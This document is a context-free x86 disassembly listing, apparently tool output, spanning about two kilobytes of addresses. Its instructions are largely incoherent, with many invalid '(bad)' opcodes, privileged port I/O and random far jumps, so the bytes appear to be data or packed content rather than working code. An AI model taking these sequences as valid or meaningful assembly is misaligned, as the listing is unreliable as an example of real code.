  414a2d:	push   0x18ca8d1e
  414a32:	int3   
  414a33:	rcl    DWORD PTR [esi-0x30360741],0x10
  414a3a:	retf   
  414a3b:	sti    
  414a3c:	stc    
  414a3d:	in     al,dx
  414a3e:	dec    esi
  414a3f:	adc    ch,BYTE PTR [esi+0x7950b6c]
  414a45:	cmp    eax,esp
  414a47:	jp     0x414a1f
  414a49:	mov    BYTE PTR [ebp-0xc],al
  414a4c:	sub    edi,esp
  414a4e:	mov    es:0xf2c1b1ce,al
  414a54:	das    
  414a55:	sbb    DWORD PTR [esi],0x41
  414a58:	lock shl DWORD PTR [ebp+0x38],cl
  414a5c:	stos   DWORD PTR es:[edi],eax
  414a5d:	sbb    al,0xc2
  414a5f:	adc    eax,0xd1e725b7
  414a64:	out    0xcd,al
  414a66:	dec    edi
  414a67:	(bad)  
  414a68:	outs   dx,BYTE PTR ds:[esi]
  414a69:	outs   dx,DWORD PTR ds:[esi]
  414a6a:	cmp    esi,DWORD PTR [edx-0x62bd3df0]
  414a70:	pop    es
  414a71:	xor    esp,DWORD PTR [ecx+0x5c]
  414a74:	push   0x95e06d7c
  414a79:	rol    BYTE PTR [eax-0xe242693],1
  414a7f:	clc    
  414a80:	cwde   
  414a81:	outs   dx,DWORD PTR ds:[esi]
  414a82:	cmp    eax,0xa1441c59
  414a87:	adc    ch,BYTE PTR [ebp+0x68688251]
  414a8d:	scas   eax,DWORD PTR es:[edi]
  414a8e:	or     DWORD PTR [edi+edi*8+0x59],esp
  414a92:	fbld   TBYTE PTR [ecx]
  414a94:	dec    edx
  414a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a96:	scas   eax,DWORD PTR es:[edi]
  414a97:	push   cs
  414a98:	xor    DWORD PTR [esp+eiz*2+0x6f],ebp
  414a9c:	and    dh,BYTE PTR [eax]
  414a9e:	gs inc ebx
  414aa0:	adc    eax,DWORD PTR es:[esi+0x539c070f]
  414aa7:	jmp    0x5872:0x56b7b0e6
  414aae:	sub    edx,ebx
  414ab0:	popf   
  414ab1:	out    dx,al
  414ab2:	mov    bh,0x58
  414ab4:	inc    ebp
  414ab5:	dec    edi
  414ab6:	adc    DWORD PTR [ebp-0x3386418f],ebp
  414abc:	cmp    BYTE PTR [esi*1+0x41825b3],0x47
  414ac4:	sti    
  414ac5:	jl     0x414b04
  414ac7:	sbb    bh,cl
  414ac9:	adc    BYTE PTR [ebx+edi*8-0x67],bh
  414acd:	xchg   esp,eax
  414ace:	frstor [ebx-0x561c1a89]
  414ad4:	xor    eax,ebx
  414ad6:	mov    bl,0x62
  414ad8:	and    BYTE PTR [esi-0x13],ah
  414adb:	add    eax,0x8da24c1e
  414ae0:	cmp    DWORD PTR ds:0x43e1f891,ebp
  414ae6:	(bad)  
  414ae7:	fs popa 
  414ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aea:	push   esp
  414aeb:	sbb    BYTE PTR [edx],cl
  414aed:	or     al,BYTE PTR ds:0xee8de7b7
  414af3:	jp     0x414ad7
  414af5:	int    0x5f
  414af7:	add    eax,0xb5fb16b8
  414afc:	add    ah,BYTE PTR [eax]
  414afe:	shl    DWORD PTR [eax+0x3c],0x6d
  414b02:	(bad)  
  414b03:	jge    0x414b04
  414b05:	dec    ecx
  414b06:	test   eax,0x4315b939
  414b0b:	aas    
  414b0c:	fisttp WORD PTR [eax+0x37d0939e]
  414b12:	add    eax,0x45cd0
  414b17:	and    BYTE PTR [edx+0x71769c9f],0xb3
  414b1e:	imul   esi,DWORD PTR [si],0x5cc5d871
  414b25:	inc    ebp
  414b26:	out    dx,al
  414b27:	adc    DWORD PTR [esi],esp
  414b29:	mov    dl,0x6d
  414b2b:	lea    ebp,[eax+0x767e6b34]
  414b31:	not    BYTE PTR [edi-0x7f008146]
  414b37:	sbb    cl,dh
  414b39:	push   0xe4cb6049
  414b3e:	pushf  
  414b3f:	sub    eax,0x7e54ed00
  414b44:	clc    
  414b45:	popa   
  414b46:	fstp   DWORD PTR [edi-0x14]
  414b49:	sti    
  414b4a:	je     0x414bb2
  414b4c:	lods   eax,DWORD PTR ds:[esi]
  414b4d:	pop    esi
  414b4e:	jmp    0x414b71
  414b50:	cwde   
  414b51:	pop    ebp
  414b52:	inc    eax
  414b53:	jmp    0x414b5a
  414b55:	lods   eax,DWORD PTR ds:[esi]
  414b56:	jmp    0x414b49
  414b58:	(bad)  
  414b5a:	daa    
  414b5b:	repz leave 
  414b5d:	rol    BYTE PTR [edi-0x70],0xc3
  414b61:	and    eax,DWORD PTR [ecx-0x79116ed8]
  414b67:	fst    QWORD PTR [edx-0x4a63d55d]
  414b6d:	cs mov dl,0xac
  414b70:	inc    ebp
  414b71:	shr    DWORD PTR [ebx+0x5765d7d1],0x20
  414b78:	adc    BYTE PTR [di+0x54],al
  414b7c:	div    ebx
  414b7e:	int3   
  414b7f:	les    edx,FWORD PTR [edx-0x2a]
  414b82:	popf   
  414b83:	mov    edx,eax
  414b85:	push   ss
  414b86:	pop    ebx
  414b87:	xchg   DWORD PTR [edi-0x12945f4c],edx
  414b8d:	mov    esp,0x6a6d5df0
  414b92:	lods   al,BYTE PTR ds:[esi]
  414b93:	stc    
  414b94:	add    BYTE PTR [ebx],bl
  414b96:	push   edi
  414b97:	sub    BYTE PTR [esi-0x36],0x7d
  414b9b:	mov    eax,ds:0x1142b80c
  414ba0:	mov    DWORD PTR [esi],edx
  414ba2:	mov    eax,ds:0xc802c668
  414ba7:	or     ah,BYTE PTR [edi+0x3ccabed2]
  414bad:	jmp    0x414c1b
  414baf:	mov    ch,0xee
  414bb1:	xchg   DWORD PTR [ebx],esp
  414bb3:	rcl    BYTE PTR [eax+0x2d],cl
  414bb6:	jl     0x414b73
  414bb8:	inc    ebx
  414bb9:	pop    esi
  414bbb:	shr    ecx,1
  414bbd:	push   esi
  414bbe:	add    eax,0x3acc9c4f
  414bc3:	push   ebp
  414bc4:	cmp    al,0x1d
  414bc6:	aam    0x87
  414bc8:	and    cl,dh
  414bca:	repz mov edi,ebp
  414bcd:	cmp    al,0xad
  414bcf:	sbb    BYTE PTR ds:0x8e9de0de,dl
  414bd5:	jnp    0x414b6a
  414bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bd8:	jb     0x414bfb
  414bda:	push   esi
  414bdb:	jg     0x414c00
  414bdd:	inc    BYTE PTR [edx-0x49]
  414be0:	fidivr DWORD PTR [ecx]
  414be2:	sbb    edi,esi
  414be4:	jmp    0xcf2cb81f
  414be9:	out    0x55,al
  414beb:	test   eax,ecx
  414bed:	int3   
  414bee:	dec    ebp
  414bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf1:	sbb    eax,0x1c48d15f
  414bf6:	int    0xbe
  414bf8:	and    edx,esi
  414bfa:	jns    0x414c71
  414bfc:	lahf   
  414bfd:	mov    esi,ss
  414bff:	or     BYTE PTR [edx-0x4904e681],ah
  414c05:	aas    
  414c06:	mov    ds:0x40945a22,eax
  414c0b:	sbb    ecx,DWORD PTR [edx+0x47]
  414c0e:	ret    
  414c0f:	arpl   si,bx
  414c11:	push   eax
  414c12:	out    dx,eax
  414c13:	xchg   ebx,eax
  414c14:	and    ah,BYTE PTR [esi-0x54]
  414c17:	sbb    al,0x1b
  414c19:	or     al,bl
  414c1b:	shl    ch,1
  414c1d:	out    0xda,al
  414c1f:	pop    ecx
  414c20:	mov    esp,0xb874599d
  414c25:	mov    ebx,0x6b75860a
  414c2a:	push   eax
  414c2b:	and    DWORD PTR [esi+0x49],eax
  414c2e:	push   ebp
  414c2f:	and    eax,0xdd312ee0
  414c34:	das    
  414c35:	adc    al,0xa8
  414c37:	idiv   eax
  414c39:	cmp    DWORD PTR [ecx-0x26],0xfffffffd
  414c3d:	adc    BYTE PTR [ebx+0x44246595],bl
  414c43:	adc    ah,BYTE PTR [esi+ebx*1]
  414c46:	jne    0x414c87
  414c48:	leave  
  414c49:	loopne 0x414be5
  414c4b:	xchg   esi,eax
  414c4c:	das    
  414c4d:	in     eax,0xf2
  414c4f:	inc    ecx
  414c50:	fisttp QWORD PTR [esi-0x19]
  414c53:	dec    edi
  414c54:	jg     0x414c7f
  414c56:	xchg   esi,eax
  414c57:	cmp    al,0x60
  414c59:	mov    bl,0xa7
  414c5b:	leave  
  414c5c:	sub    dh,dh
  414c5e:	xor    eax,0x11225233
  414c63:	sub    bh,BYTE PTR [edi+edi*4-0x60]
  414c67:	mov    ds:0xbb1b67eb,eax
  414c6c:	jge    0x414cbb
  414c6e:	sbb    ch,BYTE PTR [edx]
  414c70:	popf   
  414c71:	loopne 0x414ca4
  414c73:	mov    ebp,0x57eaef5
  414c78:	pop    ds
  414c79:	and    edi,DWORD PTR [edi-0x1a5c4a71]
  414c7f:	mov    dl,0x76
  414c81:	lods   eax,DWORD PTR ds:[esi]
  414c82:	icebp  
  414c83:	sub    al,0x3c
  414c85:	and    BYTE PTR [eax],0x3f
  414c88:	jnp    0x414cc4
  414c8a:	xor    dl,BYTE PTR [edi+eax*4]
  414c8d:	sbb    dh,bh
  414c8f:	ror    BYTE PTR [edi-0x68ac19ed],cl
  414c95:	xor    BYTE PTR [ecx],ah
  414c97:	scas   al,BYTE PTR es:[edi]
  414c98:	call   0x9e163f9c
  414c9d:	sbb    cl,BYTE PTR [edx]
  414c9f:	inc    esi
  414ca0:	aaa    
  414ca1:	lahf   
  414ca2:	sbb    DWORD PTR [ecx],ebx
  414ca4:	push   edx
  414ca5:	sbb    ecx,DWORD PTR [edi+0x26a0328a]
  414cab:	ins    DWORD PTR es:[edi],dx
  414cac:	mov    bl,0x74
  414cae:	mov    bh,ch
  414cb0:	les    edi,FWORD PTR [eax+esi*1+0x18584fdb]
  414cb7:	push   ds
  414cb8:	outs   dx,BYTE PTR ds:[esi]
  414cb9:	fimul  WORD PTR [ecx-0x3e]
  414cbc:	inc    ecx
  414cbd:	mov    esi,DWORD PTR [esi-0x17]
  414cc0:	aaa    
  414cc1:	(bad)  
  414cc2:	aam    0x47
  414cc4:	sub    ch,BYTE PTR [ecx+eax*4+0x69d24cb9]
  414ccb:	ja     0x414cab
  414ccd:	and    al,0xa8
  414ccf:	imul   esp,ebp,0x50
  414cd2:	pop    ds
  414cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd4:	int    0xdd
  414cd6:	mov    ebp,0x15aa4000
  414cdb:	(bad)  
  414cdc:	hlt    
  414cdd:	jmp    0xf2bb48ad
  414ce2:	bound  eax,QWORD PTR [ecx-0x71e0a94f]
  414ce8:	sbb    al,0xbe
  414cea:	pushf  
  414ceb:	aaa    
  414cec:	aam    0x1e
  414cee:	push   esi
  414cef:	ret    0x8453
  414cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cf3:	stos   BYTE PTR es:[edi],al
  414cf4:	scas   eax,DWORD PTR es:[edi]
  414cf5:	mov    esi,0xb7471662
  414cfa:	dec    esi
  414cfb:	jnp    0x414ce3
  414cfd:	les    edi,FWORD PTR [ebx]
  414cff:	jge    0x414cfa
  414d01:	push   es
  414d02:	paddd  mm2,QWORD PTR [eax-0x1b0de829]
  414d09:	xlat   BYTE PTR ds:[ebx]
  414d0a:	add    DWORD PTR [eax+ecx*1-0x752f037d],edi
  414d11:	push   ecx
  414d12:	adc    ebx,DWORD PTR [ebx]
  414d14:	cs ret 0xa130
  414d18:	aas    
  414d19:	arpl   WORD PTR [ecx-0x38b7369c],sp
  414d1f:	jmp    0xd0f2:0xea3546e9
  414d26:	retf   0x38a6
  414d29:	xor    BYTE PTR [ecx+eax*2+0x5141cbcb],al
  414d30:	lods   eax,DWORD PTR ds:[esi]
  414d31:	cmp    eax,0xc6b5b9cd
  414d36:	adc    al,BYTE PTR [edi+0x2a]
  414d39:	or     edx,esp
  414d3b:	mov    eax,0x444e64f9
  414d40:	sti    
  414d41:	ds test eax,0x2de25ccf
  414d47:	inc    esi
  414d48:	(bad)  
  414d49:	aas    
  414d4a:	pop    ecx
  414d4b:	stc    
  414d4c:	mov    al,dl
  414d4e:	jp     0x414dc0
  414d50:	lds    edi,FWORD PTR [edx-0x6bf2db20]
  414d56:	inc    eax
  414d57:	or     edi,DWORD PTR [edi+0x60c677c3]
  414d5d:	aaa    
  414d5e:	in     eax,0x6f
  414d60:	mov    bh,0xb8
  414d62:	push   eax
  414d63:	xchg   esp,eax
  414d64:	fimul  WORD PTR [ebp-0x4e7c2e5b]
  414d6a:	(bad)  
  414d6b:	dec    esi
  414d6c:	test   BYTE PTR [edx+eax*8+0x75],ah
  414d70:	inc    ecx
  414d71:	mov    ebp,DWORD PTR gs:[esi-0x4987cec1]
  414d78:	aad    0x12
  414d7a:	xor    ebp,DWORD PTR [esi+0x7a68753e]
  414d80:	add    DWORD PTR [edx],eax
  414d82:	xor    al,0x6
  414d84:	retf   
  414d85:	or     esp,ecx
  414d87:	xor    DWORD PTR [edx-0x1526411a],0xffffffbe
  414d8e:	push   0xee97b56
  414d93:	adc    ebp,DWORD PTR [esi]
  414d95:	arpl   WORD PTR ds:0xda00adaa,bp
  414d9b:	leave  
  414d9c:	in     al,0x55
  414d9e:	cs loope 0x414dd1
  414da1:	inc    edx
  414da2:	shr    BYTE PTR [edx-0x2de8e875],cl
  414da8:	nop
  414da9:	shl    DWORD PTR [eax+0x36],cl
  414dac:	jnp    0x414dff
  414dae:	jo     0x414da5
  414db0:	mov    ds:0xb2f2edef,eax
  414db5:	adc    DWORD PTR [ecx-0x76049f92],edi
  414dbb:	sub    ch,BYTE PTR fs:[esi-0x38]
  414dbf:	test   DWORD PTR [edi+ebp*2],edi
  414dc2:	(bad)  
  414dc3:	rol    DWORD PTR [ebp-0x31ab2a3e],1
  414dc9:	stc    
  414dca:	rol    BYTE PTR [ebx-0xc75aee6],cl
  414dd0:	mov    cs,WORD PTR [edx+0x40]
  414dd3:	jmp    0x414dab
  414dd5:	mul    DWORD PTR [edx]
  414dd7:	sbb    eax,0xc84e6f14
  414ddc:	sbb    eax,0x517c6022
  414de1:	mov    WORD PTR [ebx],ds
  414de3:	lea    edx,[esp+eiz*4+0xb18ad10]
  414dea:	or     ebp,DWORD PTR [ebx+0x22fcbc3e]
  414df0:	ins    DWORD PTR es:[edi],dx
  414df1:	sub    al,ch
  414df3:	xor    dl,BYTE PTR [edi+0x61]
  414df6:	dec    edx
  414df7:	loop   0x414e50
  414df9:	add    al,0x2b
  414dfb:	dec    ecx
  414dfc:	mov    al,ds:0xf25250ec
  414e01:	in     eax,0xb5
  414e03:	lss    ecx,FWORD PTR [ecx]
  414e06:	push   esi
  414e07:	sub    DWORD PTR [ecx+0x28],edi
  414e0a:	dec    ebp
  414e0b:	js     0x414d8d
  414e0d:	out    0x7,eax
  414e0f:	push   esi
  414e10:	pop    edx
  414e11:	(bad)  
  414e12:	(bad)  
  414e13:	cmp    eax,0xcc02f5c
  414e18:	call   0xba9f0e14
  414e1d:	sahf   
  414e1e:	adc    eax,0xea629f3e
  414e23:	mov    bh,0xbf
  414e25:	pop    eax
  414e26:	pop    ebp
  414e27:	test   ch,al
  414e29:	(bad)  [ebp+0x755b070b]
  414e2f:	out    dx,al
  414e30:	adc    bh,BYTE PTR [ebx]
  414e32:	xlat   BYTE PTR ds:[ebx]
  414e33:	push   ss
  414e34:	out    0xf8,eax
  414e36:	(bad)  
  414e37:	fld    QWORD PTR [eax-0x644faf32]
  414e3d:	push   edx
  414e3e:	ja     0x414df5
  414e40:	lods   al,BYTE PTR ds:[esi]
  414e41:	adc    eax,0xc5a776a4
  414e46:	push   ecx
  414e47:	nop
  414e48:	adc    DWORD PTR ds:0xdf71621c,ebx
  414e4e:	or     eax,0xfe87b895
  414e53:	xchg   edi,eax
  414e54:	push   0x3e
  414e56:	mov    esp,DWORD PTR [esi]
  414e58:	sub    dh,BYTE PTR [ebx+ebx*4-0x5a16e56f]
  414e5f:	xchg   esi,eax
  414e60:	(bad)  
  414e61:	push   edi
  414e62:	aad    0xf6
  414e64:	idiv   DWORD PTR [edx-0x2fd3c23d]
  414e6a:	add    al,0xdd
  414e6c:	mov    eax,ds:0xdbe2ed76
  414e71:	xchg   esi,eax
  414e72:	into   
  414e73:	sub    esp,DWORD PTR [edx+0x24]
  414e76:	(bad)  
  414e77:	imul   esp,esi,0x26
  414e7a:	pop    ebp
  414e7b:	inc    ebx
  414e7c:	clc    
  414e7d:	adc    ah,BYTE PTR [edx-0x5e]
  414e80:	pop    esi
  414e81:	jbe    0x414e64
  414e83:	jmp    0xb7b7:0x4315049b
  414e8a:	mov    ecx,0x7e961eaa
  414e8f:	fistp  DWORD PTR [ebp+0x5e]
  414e92:	jge    0x414e94
  414e94:	mov    eax,DWORD PTR [ecx+0x7f]
  414e97:	pop    edi
  414e98:	cmpxchg DWORD PTR [ebx-0x3b],esp
  414e9c:	js     0x414ee7
  414e9e:	jno    0x414e27
  414ea0:	call   0x7e8f353e
  414ea5:	loope  0x414e49
  414ea7:	div    DWORD PTR [ebp-0x16f6329a]
  414ead:	je     0x414ee6
  414eaf:	mov    cl,0xe0
  414eb1:	jl     0x414e78
  414eb3:	xchg   edx,eax
  414eb4:	sub    al,0xbb
  414eb6:	push   ebx
  414eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eb8:	sub    esp,DWORD PTR gs:[ebx+edi*1+0x6d]
  414ebd:	inc    esi
  414ebe:	sbb    cl,bh
  414ec0:	ficomp DWORD PTR ds:0x97c6adbb
  414ec6:	aam    0x51
  414ec8:	add    eax,0x8c1cae11
  414ecd:	mov    edi,0xd5713683
  414ed2:	stos   BYTE PTR es:[edi],al
  414ed3:	(bad)  
  414ed4:	mov    edx,0x40fded2
  414ed9:	lahf   
  414eda:	inc    ebx
  414edb:	jno    0x414e86
  414edd:	repnz sti 
  414edf:	in     eax,dx
  414ee0:	sar    ebp,cl
  414ee2:	pop    ebp
  414ee3:	shl    ebp,1
  414ee5:	test   DWORD PTR [eax],edx
  414ee7:	int    0xc0
  414ee9:	stos   DWORD PTR es:[edi],eax
  414eea:	pop    esp
  414eeb:	popa   
  414eec:	jp     0x414ecd
  414eee:	sbb    al,0x57
  414ef0:	inc    esi
  414ef1:	aaa    
  414ef2:	out    dx,al
  414ef3:	scas   eax,DWORD PTR es:[edi]
  414ef4:	pop    edi
  414ef5:	jecxz  0x414f64
  414ef7:	scas   al,BYTE PTR es:[edi]
  414ef8:	mov    ss,WORD PTR [edx*1-0x74025ed5]
  414eff:	jo     0x414ee0
  414f01:	xor    ch,dh
  414f03:	inc    eax
  414f04:	dec    eax
  414f05:	mov    edi,cs
  414f07:	repz inc esp
  414f09:	pop    ebp
  414f0a:	inc    edi
  414f0b:	lods   al,BYTE PTR ds:[esi]
  414f0c:	test   DWORD PTR [edi-0x39c6aa2a],esp
  414f12:	push   ss
  414f13:	shl    DWORD PTR ds:0xe6253fbc,0x27
  414f1a:	inc    ebx
  414f1b:	setne  BYTE PTR [edx-0x3f]
  414f1f:	neg    DWORD PTR [ecx]
  414f21:	(bad)  
  414f22:	(bad)  
  414f23:	xor    DWORD PTR [ebx+0x224a60e7],ecx
  414f29:	rcr    DWORD PTR [esi+0x41],0x74
  414f2d:	pop    edx
  414f2e:	sbb    DWORD PTR [ecx+0x6c],esp
  414f31:	add    eax,0x1721bc7c
  414f36:	pop    ss
  414f37:	loope  0x414f04
  414f39:	add    BYTE PTR [ebx+0x78c2a142],0x64
  414f40:	fucom  st(5)
  414f42:	fwait
  414f43:	popf   
  414f44:	adc    eax,0xa4dc20ec
  414f49:	mov    edx,0xe5e3f4db
  414f4e:	cld    
  414f4f:	jns    0x414eec
  414f51:	xchg   ebp,eax
  414f52:	not    cl
  414f54:	xchg   ebp,eax
  414f55:	xor    BYTE PTR [ebp+0x68da0892],al
  414f5b:	pop    ebx
  414f5c:	int    0xc5
  414f5e:	dec    ebx
  414f5f:	mov    ?,WORD PTR [ebp-0x1f]
  414f62:	push   esi
  414f63:	push   ebx
  414f64:	push   es
  414f65:	xor    al,cl
  414f67:	andnps xmm1,XMMWORD PTR [esi+0x1d3ea4c6]
  414f6e:	pushw  cs
  414f70:	aam    0xbf
  414f72:	mov    ecx,0xa2dc69b8
  414f77:	rcr    dl,1
  414f79:	fsubr  st,st(6)
  414f7b:	into   
  414f7c:	(bad)  
  414f7e:	inc    edx
  414f7f:	mov    esi,0x57554f91
  414f84:	out    0xac,al
  414f86:	adc    eax,DWORD PTR [edi+0x6e271c35]
  414f8c:	int    0x2d
  414f8e:	push   0xfbab5b96
  414f93:	(bad)  
  414f94:	sti    
  414f95:	es push ebp
  414f97:	cs push esi
  414f99:	lods   eax,DWORD PTR ds:[esi]
  414f9a:	ins    DWORD PTR es:[edi],dx
  414f9b:	mov    dl,0x9
  414f9d:	inc    edi
  414f9e:	outs   dx,DWORD PTR ds:[esi]
  414f9f:	ret    
  414fa0:	mov    ebx,0x78a58983
  414fa5:	or     BYTE PTR [eax],0xe2
  414fa8:	daa    
  414fa9:	lock jecxz 0x414f33
  414fac:	fisttp WORD PTR [eax+0x60]
  414faf:	xor    bh,al
  414fb1:	shl    DWORD PTR [edx-0x2a0f69c1],cl
  414fb7:	popf   
  414fb8:	fdiv   st(3),st
  414fba:	lahf   
  414fbb:	jge    0x414f50
  414fbd:	fidivr DWORD PTR [edx]
  414fbf:	xchg   edx,eax
  414fc0:	cmp    bh,BYTE PTR [eax-0x34]
  414fc3:	ror    BYTE PTR [edi+0x2d9f5c80],cl
  414fc9:	sub    ecx,DWORD PTR [esi-0x4889e86a]
  414fcf:	push   0xb90c390f
  414fd4:	add    ebx,edx
  414fd6:	cdq    
  414fd7:	scas   al,BYTE PTR es:[edi]
  414fd8:	jg     0x414ffe
  414fda:	mov    edi,0x21912eee
  414fdf:	jae    0x414ff7
  414fe1:	mov    esp,0xec7d0557
  414fe6:	mov    ds:0xb61a54ec,eax
  414feb:	mov    ch,cl
  414fed:	cmp    cl,BYTE PTR [esp+edx*2-0x5d]
  414ff1:	adc    DWORD PTR [edi-0x6c26eca3],ebp
  414ff7:	mov    ecx,cs
  414ff9:	aaa    
  414ffa:	sbb    edx,DWORD PTR [ecx]
  414ffc:	or     BYTE PTR [ebp+edi*1-0x36846254],bh
  415003:	fyl2xp1 
  415005:	adc    BYTE PTR [edx-0x4e7e28ff],ch
  41500b:	aad    0x3a
  41500d:	ror    DWORD PTR [esi-0x442e9513],0x25
  415014:	leave  
  415015:	fs push cs
  415017:	daa    
  415018:	push   cs
  415019:	sub    dl,BYTE PTR [esi-0x50]
  41501c:	push   eax
  41501d:	jp     0x414fe9
  41501f:	es out dx,eax
  415021:	mov    edi,DWORD PTR [ebp+eiz*2-0x40]
  415025:	mul    DWORD PTR ds:0xd03a544f
  41502b:	add    bh,BYTE PTR [esi-0x3f]
  41502e:	imul   ecx,DWORD PTR [ebx-0x4e],0xffffffb0
  415032:	test   al,0xdb
  415034:	adc    BYTE PTR [ebp-0x7858d686],dh
  41503a:	fnstsw WORD PTR [eax-0x4f2e7267]
  415040:	mov    ch,0x0
  415042:	mov    esp,0x6ba43465
  415047:	pop    eax
  415048:	ror    eax,1
  41504a:	dec    eax
  41504b:	sub    BYTE PTR [edx-0x61],bl
  41504e:	xchg   ch,dl
  415050:	clc    
  415051:	cmc    
  415052:	sbb    al,0x5b
  415054:	pop    ds
  415055:	dec    esp
  415056:	fist   DWORD PTR [esi]
  415058:	sti    
  415059:	scas   eax,DWORD PTR es:[edi]
  41505a:	xchg   ebp,eax
  41505b:	dec    ebx
  41505c:	clc    
  41505d:	mov    edi,DWORD PTR [ebp+edi*2-0x23]
  415061:	daa    
  415062:	and    dl,ah
  415064:	sub    al,BYTE PTR [edx+0x72aa1e23]
  41506a:	mov    cl,0x91
  41506c:	dec    ebp
  41506d:	sub    bl,cl
  41506f:	sub    dh,bl
  415071:	dec    esp
  415072:	fist   DWORD PTR [edi+0x16]
  415075:	shr    DWORD PTR [edi+ebp*2+0x3a9a7cea],1
  41507c:	je     0x41505a
  41507e:	popa   
  41507f:	sbb    al,0x91
  415081:	pop    edi
  415082:	dec    ebp
  415083:	sub    DWORD PTR [edx+ecx*1+0x46807cbd],esi
  41508a:	cmp    al,BYTE PTR [eax+0x56]
  41508d:	bound  ebp,QWORD PTR [esi-0x2d]
  415090:	cmp    al,0xa6
  415092:	inc    edx
  415093:	repnz add dh,dh
  415096:	xchg   DWORD PTR [esi+ebp*8],edi
  415099:	lods   eax,DWORD PTR ds:[esi]
  41509a:	jle    0x4150f3
  41509c:	pop    esi
  41509d:	fxch   st(1)
  41509f:	jae    0x41507b
  4150a1:	mov    ch,0xd6
  4150a3:	push   ecx
  4150a4:	fstp   DWORD PTR [edi-0x79]
  4150a7:	jmp    0x415119
  4150a9:	mov    ch,0xae
  4150ab:	xchg   esi,eax
  4150ac:	sub    eax,0xdb181e42
  4150b1:	adc    BYTE PTR [esi],ch
  4150b3:	push   ebp
  4150b4:	dec    edx
  4150b5:	inc    edi
  4150b6:	lahf   
  4150b7:	jno    0x415084
  4150b9:	fisubr DWORD PTR [edx]
  4150bb:	and    eax,DWORD PTR [edi]
  4150bd:	sahf   
  4150be:	jno    0x4150a0
  4150c0:	sbb    edx,DWORD PTR [edx-0x4e]
  4150c3:	pusha  
  4150c4:	das    
  4150c5:	fs jnp 0x4150d4
  4150c8:	dec    edx
  4150c9:	in     eax,dx
  4150ca:	fwait
  4150cb:	je     0x415081
  4150cd:	jbe    0x41505d
  4150cf:	mov    dh,0xa6
  4150d1:	pop    ecx
  4150d2:	iret   
  4150d3:	push   eax
  4150d4:	push   ebx
  4150d5:	in     al,dx
  4150d6:	test   BYTE PTR [eax],bl
  4150d8:	or     al,0x92
  4150da:	push   0xffffffa4
  4150dc:	test   DWORD PTR [edi],eax
  4150de:	outs   dx,DWORD PTR ds:[esi]
  4150df:	test   eax,0xba77e08a
  4150e4:	cmp    DWORD PTR [ebx+0x66],edi
  4150e7:	out    0xa2,al
  4150e9:	(bad)  
  4150ea:	dec    BYTE PTR [edi-0x7ab7ecf6]
  4150f0:	xchg   ebp,eax
  4150f1:	jno    0x4150d6
  4150f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f4:	or     ch,BYTE PTR [eax-0x3d]
  4150f7:	ficomp DWORD PTR [ecx]
  4150f9:	mov    ecx,0x397f1f38
  4150fe:	adc    BYTE PTR [ebp-0x5a628f89],bh
  415104:	or     BYTE PTR [edx+0x3c80cdc2],cl
  41510a:	mov    ecx,0x3ebee73b
  41510f:	aas    
  415110:	xchg   BYTE PTR [edi-0x71],bh
  415113:	loop   0x41514f
  415115:	xchg   edi,eax
  415116:	sbb    al,0xfc
  415118:	push   ss
  415119:	jg     0x4150d1
  41511b:	mov    edi,0x1b88b0e3
  415120:	(bad)  
  415121:	enter  0xc0f7,0x2e
  415125:	push   esi
  415126:	jo     0x415184
  415128:	scas   eax,DWORD PTR es:[edi]
  415129:	dec    esi
  41512a:	(bad)  
  41512b:	(bad)  
  41512d:	js     0x415109
  41512f:	aaa    
  415130:	dec    esi
  415131:	push   0xffffffcd
  415133:	rol    bl,0x37
  415136:	cmp    esi,ecx
  415138:	push   es
  415139:	aad    0x16
  41513b:	fs jmp 0x4151a3
  41513e:	out    dx,eax
  41513f:	sub    eax,esp
  415141:	cli    
  415142:	outs   dx,BYTE PTR ds:[esi]
  415143:	jne    0x415101
  415145:	xchg   dh,bh
  415147:	dec    edi
  415148:	cmc    
  415149:	xchg   esi,eax
  41514a:	add    al,0x80
  41514c:	addr16 push 0x378a0894
  415152:	lds    edx,FWORD PTR [ebx+0x32e59a1d]
  415158:	xchg   edi,eax
  415159:	enter  0xe81c,0xf9
  41515d:	call   0x4ef2:0x287eee10
  415164:	jle    0x41516b
  415166:	daa    
  415167:	pause  
  415169:	add    DWORD PTR [edi-0x6],ecx
  41516c:	mov    esp,0x192c4dfc
  415171:	inc    esp
  415172:	imul   edx,DWORD PTR [ebx-0x357a8601],0x64
  415179:	jle    0x41511e
  41517b:	cmp    al,0x93
  41517d:	pop    esi
  41517e:	fld    DWORD PTR [ebp+0x67f7a20b]
  415184:	mov    eax,ds:0x50c768e3
  415189:	in     eax,dx
  41518a:	sub    al,0x13
  41518c:	dec    edx
  41518d:	dec    ecx
  41518e:	pop    es
  41518f:	push   ebp
  415190:	shl    DWORD PTR [ebx],cl
  415192:	add    eax,DWORD PTR [esi-0x6f]
  415195:	enter  0x3deb,0x39
  415199:	jp     0x415203
  41519b:	push   ebx
  41519c:	add    al,bh
  41519e:	ret    
  41519f:	add    BYTE PTR [edx],dl
  4151a1:	xchg   esp,eax
  4151a2:	push   edi
  4151a3:	jmp    0x50f91f15
  4151a8:	xor    eax,0x1d478b5e
  4151ad:	inc    esi
  4151ae:	xchg   BYTE PTR [esi],ah
  4151b0:	jg     0x41522c
  4151b2:	je     0x415218
  4151b4:	push   ss
  4151b5:	sbb    edi,DWORD PTR [ebp-0x2e]
  4151b8:	pop    esi
  4151b9:	ret    
  4151ba:	xor    edi,edi
  4151bc:	out    dx,al
  4151bd:	imul   ebp,DWORD PTR [ecx],0x705fa9cc
  4151c3:	shr    BYTE PTR [esi-0x53],0x80
  4151c7:	jge    0x415179
  4151c9:	mov    DWORD PTR [ebx+0x7c],ebp
  4151cc:	pop    ds
  4151cd:	dec    ecx
  4151ce:	mov    BYTE PTR [ebp+0x41bfb97b],dl
  4151d4:	jne    0x4151a0
  4151d6:	inc    ecx
  4151d7:	jns    0x4151b6
  4151d9:	sahf   
  4151da:	rcl    BYTE PTR [ecx],0x57
  4151dd:	aas    
  4151de:	xchg   ah,al
  4151e0:	cmp    al,0x66
